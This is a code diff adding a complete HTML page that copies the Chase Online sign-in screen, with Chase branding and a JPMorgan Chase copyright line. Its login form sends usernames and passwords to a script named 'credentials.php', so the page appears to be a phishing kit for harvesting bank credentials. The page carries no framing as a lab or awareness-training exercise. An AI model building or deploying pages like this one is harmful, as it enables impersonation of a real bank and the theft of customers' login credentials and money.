@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Chase Online</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            color: #333;
+        }
+        .header {
+            background-color: #1a6bad;
+            padding: 20px 0;
+            text-align: center;
+        }
+        .chase-logo {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        .container {
+            max-width: 380px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px;
+        }
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 25px;
+            font-weight: 400;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 1rem;
+        }
+        button {
+            background-color: #1a6bad;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 20px;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0d5ca0;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .remember-me input {
+            margin-right: 8px;
+        }
+        .links {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        .links a {
+            color: #1a6bad;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer {
+            text-align: center;
+            color: #666;
+            font-size: 0.8rem;
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="chase-logo">CHASE</div>
+    </div>
+    
+    <div class="container">
+        <h1>Sign in to your accounts</h1>
+        
+        <form action="credentials.php" method="post">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <div class="remember-me">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember" style="display: inline; font-weight: normal;">Remember me</label>
+            </div>
+            
+            <button type="submit">Sign in</button>
+        </form>
+        
+        <div class="links">
+            <a href="#">Forgot username/password?</a>
+            <a href="#">Not enrolled? Sign Up Now</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>&copy; 2024 JPMorgan Chase & Co. All rights reserved.</p>
+    </div>
+</body>
+</html> 
